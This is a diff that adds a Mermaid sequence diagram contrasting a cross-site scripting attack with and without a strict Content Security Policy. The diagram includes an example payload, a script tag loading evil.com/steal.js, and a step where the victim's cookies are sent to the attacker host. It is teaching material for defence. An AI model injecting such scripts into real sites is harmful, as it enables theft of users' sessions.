@@ -1,0 +1,17 @@
+sequenceDiagram
+    autonumber
+    actor User as Victim Browser
+    participant App as Web Application
+    actor Hacker as Attacker Server
+
+    User->>App: Visits page containing stored/reflected payload: <script src='evil.com/steal.js'></script>
+    App-->>User: Returns HTML containing the script tag
+    
+    alt Case 1: No Content Security Policy (Vulnerable)
+        Note over User: Browser executes script blindly
+        User->>Hacker: Sends document.cookie to evil.com/steal.js
+    else Case 2: Strict CSP Enabled (Secure)
+        Note over User: Browser checks Response Header:<br>Content-Security-Policy: default-src 'self'
+        Note over User: Blocks connection to "evil.com" (Not in allowlist)
+        User--xHacker: Script execution blocked. Attack stopped.
+    end
